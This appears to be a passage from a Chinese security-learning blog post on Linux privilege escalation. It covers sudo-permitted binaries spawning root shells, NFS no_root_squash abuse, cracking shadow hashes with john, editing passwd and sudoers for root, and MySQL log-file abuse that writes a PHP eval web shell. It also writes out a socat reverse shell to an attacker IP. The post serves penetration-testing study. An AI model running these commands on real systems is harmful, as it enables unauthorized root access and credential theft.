+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901114902493.png" alt="image-20220901114902493"></p>
+<h5 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h5><p><img src="/2023/02/13/Linux-PowerUp/image-20220901114453769.png" alt="image-20220901114453769"></p>
+<p><code>$</code>变成<code>#</code>，成功登录</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901114726423.png" alt="image-20220901114726423"></p>
+<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h4><p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。</p>
+<p>这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure>
+
+<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224325691.png" alt="image-20220901224325691"></p>
+<p>相关命令提权方式如下：</p>
+<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
+<p><code>exec</code>参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用<code>\</code>进行转义。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224342169.png" alt="image-20220901224342169"></p>
+<h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote>
+<p><code>e</code>参数用来指定要运行的命令，然后使用<code>linux</code>的<code>exec</code>参数来调用<code>bash</code>。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224356163.png" alt="image-20220901224356163"></p>
+<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote>
+<p><code>c</code>参数可以在命令行执行<code>python</code>代码，<code>pty</code>库是一个伪终端库，它的<code>spawn</code>会调用指定的程序。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224409127.png" alt="image-20220901224409127"></p>
+<h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote>
+<p>输入<code>sudo less /etc/hosts</code>命令浏览文件内容时，到底部输入<code>!bash</code>后回车，会获得一个<code>root</code>权限的<code>shell</code>。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224420552.png" alt="image-20220901224420552"></p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224511943.png" alt="image-20220901224511943"></p>
+<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote>
+<p>通过调用linux的system函数来打开bash。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224431624.png" alt="image-20220901224431624"></p>
+<h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
+<p>通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224541655.png" alt="image-20220901224541655"></p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224551402.png" alt="image-20220901224551402"></p>
+<h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote>
+<p><code>sudo vi</code>会进入vi默认页，输入<code>:!bash</code>回车，可进入<code>root</code>命令行。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224609706.png" alt="image-20220901224609706"></p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224622369.png" alt="image-20220901224622369"></p>
+<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><blockquote>
+<p>如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
+</blockquote>
+<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224639423.png" alt="image-20220901224639423"></p>
+<p>参考代码：</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901224909264.png" alt="image-20220901224909264"></p>
+<h4 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a><strong>应用程序</strong></h4><blockquote>
+<p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225004858.png" alt="image-20220901225004858"></p>
+<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote>
+<p>通过env环境变量来获取root权限。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225022285.png" alt="image-20220901225022285"></p>
+<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote>
+<p>通过ftp来进入bash获取root权限。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225031965.png" alt="image-20220901225031965"></p>
+<h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote>
+<p>通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">攻击机执行：</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225047468.png" alt="image-20220901225047468"></p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225056003.png" alt="image-20220901225056003"></p>
+<h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote>
+<p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
+<p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225110501.png" alt="image-20220901225110501"></p>
+<h4 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a><strong>黑名单情况</strong></h4><blockquote>
+<p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901225127772.png" alt="image-20220901225127772"></p>
+<h2 id="3-NFS配置不当导致提权"><a href="#3-NFS配置不当导致提权" class="headerlink" title="3) NFS配置不当导致提权"></a>3) NFS配置不当导致提权</h2><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><blockquote>
+<p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
+</blockquote>
+<p>这里以ubuntu为例，简单配置一下：</p>
+<p>首先安装nfs服务端：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure>
+
+<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
+
+<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
+<p>随后重启相关服务：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下sudo <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs<span class="operator">-</span>kernel<span class="operator">-</span>server restart</span><br></pre></td></tr></table></figure>
+
+<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231323392.png" alt="image-20220901231323392"></p>
+<p>或者通过nmap的相关脚本来进行扫描。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231334381.png" alt="image-20220901231334381"></p>
+<h3 id="NFS配置不当可提权"><a href="#NFS配置不当可提权" class="headerlink" title="NFS配置不当可提权"></a><strong>NFS配置不当可提权</strong></h3><blockquote>
+<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。</p>
+</blockquote>
+<p>测试如下：</p>
+<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231351979.png" alt="image-20220901231351979"></p>
+<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
+<p>普通用户执行即可获取root权限，这里注意需要加上<code>p</code>参数，否则权限还是当前用户的。</p>
+<p><code>p</code>参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承<code>suid</code>，因为bash有<code>suid</code>权限，所以这里是root。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231410196.png" alt="image-20220901231410196"></p>
+<p>使用场景：这个和<code>suid</code>提权很像，给程序赋予<code>suid</code>权限然后利用。不同的是前两篇<code>suid</code>提权是当前用户使用<code>sudo  chmod</code>自己修改的，在<code>sudoers</code>禁用<code>sudo</code>命令等情况下，就行不通了。而<code>nfs</code>配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
+<p>同理，之前总结的<code>suid</code>提权的那些程序也同样适用，这里就不再记了。</p>
+<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a><strong>其它命令</strong></h3><p>除了可以直接得到<code>shell</code>的，还有其他一些程序不能直接获取，例如<code>nano、vi</code>等。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231423093.png" alt="image-20220901231423093"></p>
+<p>然后使用<code>nano -p</code>来读取<code>shadow</code>文件，这里读取时把相关记录复制出来，使用<code>john</code>破解，测试不能重定向，需要权限，所以只能复制。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231435125.png" alt="image-20220901231435125"></p>
+<p>复制后使用<code>john</code>破解获取相关用户密码，以<code>root</code>为例，密码是<code>root</code>。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231451129.png" alt="image-20220901231451129"></p>
+<p>如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是<code>aaa</code>用户，破解<code>aaa</code>密码为<code>aaa</code>。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231505353.png" alt="image-20220901231505353"></p>
+<p>这时候不确定<code>aaa</code>是否为<code>root</code>权限，则可以继续使用<code>nano</code>去编辑<code>passwd</code>文件，给<code>aaa</code>赋权。</p>
+<p>把原来的<code>1001</code>换成<code>0</code>.</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231516388.png" alt="image-20220901231516388"></p>
+<p>然后切换<code>aaa</code>用户即可。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231524654.png" alt="image-20220901231524654"></p>
+<p>利用这种机制，也可以用来修改<code>sudoers</code>文件，添加或修改为以下内容。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>sudo bash</code>或<code>sudo su</code>获取<code>root</code>权限。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901231537204.png" alt="image-20220901231537204"></p>
+<h2 id="4）Mysql提权"><a href="#4）Mysql提权" class="headerlink" title="4）Mysql提权"></a>4）Mysql提权</h2><h3 id="1、通过mysql日志功能"><a href="#1、通过mysql日志功能" class="headerlink" title="1、通过mysql日志功能"></a>1、通过mysql日志功能</h3><blockquote>
+<p><code>SHOW VARIABLES LIKE &#39;general%&#39; 查询日志</code></p>
+<p><code>set global general_log = &quot;ON&quot;; 开启日志记录</code></p>
+<p><code>set global general_log_file=&#39;C://phpStudy//PHPTutorial//WWW//shell.php&#39;; 设置日志路径</code></p>
+<p><code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;; 写入一句话</code></p>
+</blockquote>
+<p><img src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp" alt="img"></p>
+<p><img src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp" alt="img"></p>
+<p>连接成功</p>
+<h2 id="5）环境变量提权"><a href="#5）环境变量提权" class="headerlink" title="5）环境变量提权"></a>5）环境变量提权</h2><p><code>nepctf2023遇到</code></p>
+<hr>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post_share"><div class="social-share" data-image="/img/17.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/13/php-functions/"><img class="prev-cover" src="/img/22.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP函数记录</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/13/tooluse(bp-bruce)/"><img class="next-cover" src="/img/26.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Burpsuite密码爆破</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/02/13/Reverses-shell/" title="反弹shell"><img class="cover" src="/img/24.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-08-06</div><div class="title">反弹shell</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%89%E5%88%A9%E7%94%A8SUID%E6%8F%90%E6%9D%83"><span class="toc-text">1）利用SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsuid%EF%BC%9F"><span class="toc-text">什么是suid？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSGID"><span class="toc-text">什么是SGID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID%E6%9D%83%E9%99%90"><span class="toc-text">SUID权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE"><span class="toc-text">*关键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%88%A9%E7%94%A8find%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="toc-text">（1）利用find获取root权限shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8cp%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="toc-text">（2）利用cp获取root权限shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%88%A9%E7%94%A8Vim%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="toc-text">（3）利用Vim获取root权限shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%88%A9%E7%94%A8nmap%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="toc-text">（4）利用nmap获取root权限shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%97%A7%E7%89%88"><span class="toc-text">1.旧版</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%B0%E7%89%88"><span class="toc-text">2.新版</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="toc-text">（5）利用脚本获取root权限shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8SUDO%E6%8F%90%E6%9D%83"><span class="toc-text">2）利用SUDO提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E5%92%8Csu%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">sudo和su的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoers%E6%96%87%E4%BB%B6"><span class="toc-text">sudoers文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-su-sudo-bash"><span class="toc-text">sudo su &amp;&amp; sudo bash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SUDO-dd-%E6%8F%90%E6%9D%83%E6%B3%95"><span class="toc-text">*SUDO -dd 提权法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GIT"><span class="toc-text">*GIT</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-text">*注意</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%AA%97%E5%8F%A3%E8%B6%B3%E5%A4%9F%E5%A4%A7"><span class="toc-text">1.窗口足够大</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E7%AA%97%E5%8F%A3%E5%B0%8F%E4%B8%80%E4%BA%9B"><span class="toc-text">2.窗口小一些</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF%E5%88%B0root%E7%9A%84shell"><span class="toc-text">1.执行命令，拿到root的shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95"><span class="toc-text">2.修改密码，登录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="toc-text">其他命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#find"><span class="toc-text">find</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#perl"><span class="toc-text">perl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#less"><span class="toc-text">less</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#awk"><span class="toc-text">awk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#man"><span class="toc-text">man</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#vi"><span class="toc-text">*vi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">应用程序</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#env"><span class="toc-text">env</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ftp"><span class="toc-text">ftp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#socat"><span class="toc-text">socat</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#scp"><span class="toc-text">scp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%83%85%E5%86%B5"><span class="toc-text">黑名单情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-NFS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83"><span class="toc-text">3) NFS配置不当导致提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS%E4%BB%8B%E7%BB%8D"><span class="toc-text">NFS介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%8F%AF%E6%8F%90%E6%9D%83"><span class="toc-text">NFS配置不当可提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%91%BD%E4%BB%A4"><span class="toc-text">其它命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%EF%BC%89Mysql%E6%8F%90%E6%9D%83"><span class="toc-text">4）Mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%80%9A%E8%BF%87mysql%E6%97%A5%E5%BF%97%E5%8A%9F%E8%83%BD"><span class="toc-text">1、通过mysql日志功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%EF%BC%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-text">5）环境变量提权</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2022.5 - 2023 By Ttoc</div><div class="footer_custom_text">This blog is mainly used for me to learn and record,wish it can help you too.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/sun_moon.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script></div></body></html><div id="web_bg"></div>
